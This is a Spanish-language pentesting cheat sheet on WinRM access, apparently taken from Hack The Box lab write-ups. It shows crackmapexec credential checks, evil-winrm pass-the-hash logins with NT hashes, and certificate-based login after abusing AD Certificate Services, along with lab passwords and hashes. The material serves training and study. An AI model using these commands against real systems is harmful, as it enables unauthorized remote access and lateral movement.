# WINRM

## Validación de credenciales

```null
crackmapexec winrm 10.10.10.192 -u support -p '#00^BlackKnight'
```

## Autenticación por NT

```null
evil-winrm -i 10.10.10.192 -u svc_backup -H 9658d1d1dcd9250115e2205d9f48400d
```

## Autenticación por contraseña

```null
evil-winrm -u 'sflowers' -H '1FCDB1F6015DCB318CC77BB2BDA14DB5' -i 10.10.11.175
```

## Abuso Microsoft Active Directory Certificate Services

### Generar certificados con openssl

```null
openssl req -newkey rsa:2048 -nodes -keyout amanda.key -out amanda.csr

You are about to be asked to enter information that will be incorporated
into your certificate request.
What you are about to enter is what is called a Distinguished Name or a DN.
There are quite a few fields but you can leave some blank
For some fields there will be a default value,
If you enter '.', the field will be left blank.
-----
Country Name (2 letter code) [AU]:
State or Province Name (full name) [Some-State]:
Locality Name (eg, city) []:
Organization Name (eg, company) [Internet Widgits Pty Ltd]:
Organizational Unit Name (eg, section) []:
Common Name (e.g. server FQDN or YOUR name) []:
Email Address []:

Please enter the following 'extra' attributes
to be sent with your certificate request
A challenge password []:
An optional company name []:
```

Copio el csr y se lo proporciono al servicio

![image](https://rubbxalc.github.io/writeups/assets/img/Sizzle-htb/7.png)

Descargo la clave pública y con ``evil-winrm`` me conecto a la máquina

![image](https://rubbxalc.github.io/writeups/assets/img/Sizzle-htb/8.png)

```null
evil-winrm -S -c amanda.cer -k amanda.key -i 10.10.10.103 -u 'amanda' -p 'Ashare1972'

Evil-WinRM shell v3.4

Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine

Data: For more information, check Evil-WinRM Github: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Warning: SSL enabled

Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\amanda\Documents> 
```

